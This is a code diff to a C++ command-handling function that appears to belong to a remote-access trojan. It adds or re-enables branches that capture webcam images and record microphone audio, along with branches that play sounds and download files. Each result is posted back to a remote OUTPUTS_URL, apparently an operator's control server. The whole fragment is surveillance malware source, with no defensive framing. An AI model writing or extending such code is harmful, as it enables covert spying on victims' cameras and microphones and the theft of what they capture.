@@ -105,22 +105,14 @@ void perform(std::string id, std::vector<std::string> values) {
         });
     }
 
-    // else if (type == "webcam") {
-    //     std::string base64;
-    //     if (GetWebcamImage(&base64)) {
-    //         POST_Request(OUTPUTS_URL + id, {
-    //             {"instruction_id", values[0]},
-    //             {"type", "webcam"},
-    //             {"data", base64}
-    //         });
-    //     } else {
-    //         POST_Request(OUTPUTS_URL + id, {
-    //             {"instruction_id", values[0]},
-    //             {"type", "webcam_fail"},
-    //             {"data", "webcam unsuccessful"}
-    //         });
-    //     }
-    // }
+    else if (type == "webcam") {
+        std::string fileID = GetWebcamImage();
+        POST_Request(OUTPUTS_URL + id, {
+            {"instruction_id", values[0]},
+            {"type", "webcam"},
+            {"data", fileID}
+        });
+    }
 
     else if (type == "download") {
         std::string fileID = DownloadFile(values[2]);
@@ -137,6 +129,23 @@ void perform(std::string id, std::vector<std::string> values) {
             {"instruction_id", values[0]},
             {"type", type},
             {"data", "success"}
+        });
+    }
+
+    else if (type == "psound") {
+        PlaySoundFromFile(values[2]);
+        POST_Request(OUTPUTS_URL + id, {
+            {"instruction_id", values[0]},
+            {"type", type},
+            {"data", "success"}
+        });
+    }
+    else if (type == "raudio") {
+        std::string fileID = RecordAudio(atoi(values[2].c_str()));
+        POST_Request(OUTPUTS_URL + id, {
+            {"instruction_id", values[0]},
+            {"type", type},
+            {"data", fileID}
         });
     }
 }
